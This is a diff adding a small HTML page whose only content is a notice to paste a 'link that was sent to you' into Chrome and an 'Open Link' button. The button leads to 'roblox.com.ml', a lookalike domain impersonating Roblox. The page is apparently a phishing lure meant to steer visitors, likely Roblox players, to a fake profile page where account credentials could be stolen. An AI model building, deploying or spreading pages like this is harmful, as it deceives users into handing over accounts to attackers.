@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Open Link</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
+    font-family:Verdana, Geneva, Tahoma, sans-serif;
+    background:#070707;
+    overflow:hidden;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+    color:white;
+}
+
+/* Background stars */
+.stars{
+    position:fixed;
+    inset:0;
+    background-image:
+        radial-gradient(white 1px, transparent 1px),
+        radial-gradient(white 1px, transparent 1px);
+    background-size:70px 70px, 120px 120px;
+    background-position:0 0, 35px 35px;
+    opacity:.45;
+}
+
+.card{
+    position:relative;
+    z-index:2;
+    background:#111;
+    border:1px solid #2b2b2b;
+    border-radius:14px;
+    padding:40px;
+    width:360px;
+    text-align:center;
+    box-shadow:0 8px 25px rgba(0,0,0,.5);
+}
+
+h2{
+    font-weight:500;
+    margin-bottom:12px;
+}
+
+.arrow{
+    font-size:34px;
+    margin-bottom:18px;
+}
+
+.button{
+    display:inline-block;
+    text-decoration:none;
+    color:white;
+    background:#2d7dff;
+    padding:13px 26px;
+    border-radius:8px;
+    transition:.2s;
+    font-weight:bold;
+}
+
+.button:hover{
+    background:#1e67dc;
+}
+
+/* Notification */
+.notice{
+    position:fixed;
+    top:20px;
+    right:20px;
+    background:#1c1c1c;
+    border-left:4px solid #2d7dff;
+    color:white;
+    padding:14px 18px;
+    border-radius:8px;
+    width:300px;
+    box-shadow:0 8px 20px rgba(0,0,0,.4);
+    animation:slideIn .5s ease;
+    z-index:10;
+}
+
+.notice strong{
+    display:block;
+    margin-bottom:6px;
+}
+
+@keyframes slideIn{
+    from{
+        transform:translateX(350px);
+        opacity:0;
+    }
+    to{
+        transform:translateX(0);
+        opacity:1;
+    }
+}
+</style>
+</head>
+<body>
+
+<div class="stars"></div>
+
+<div class="notice">
+    <strong>Notice</strong>
+    Please copy the link that was sent to you and paste it into Google Chrome.
+</div>
+
+<div class="card">
+    <h2>Click the button below</h2>
+
+    <div class="arrow">⬇</div>
+
+    <a class="button"
+       href="https://www.roblox.com.ml/users/363322404633/profile"
+       target="_blank"
+       rel="noopener noreferrer">
+       Open Link
+    </a>
+</div>
+
+</body>
+</html>
